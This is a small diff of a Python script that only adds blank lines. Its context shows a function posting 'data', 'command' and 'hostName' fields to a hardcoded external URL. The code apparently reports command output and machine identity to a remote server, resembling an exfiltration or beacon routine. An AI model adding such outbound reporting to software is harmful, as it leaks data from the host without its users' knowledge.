@@ -2,6 +2,7 @@ import requests, json
 
 url = r'https://techxi.us.kg/post'
 
+
 def postData(data, command, hostName):
     try:
         response = requests.post(url, data={'data': data, 'command': command, 'hostName': hostName}, timeout=5)
@@ -10,6 +11,7 @@ def postData(data, command, hostName):
     if response.text == 'OK':
         return True
     return False
+
 
 if __name__ == '__main__':
     url = r'https://techxi.us.kg/post'
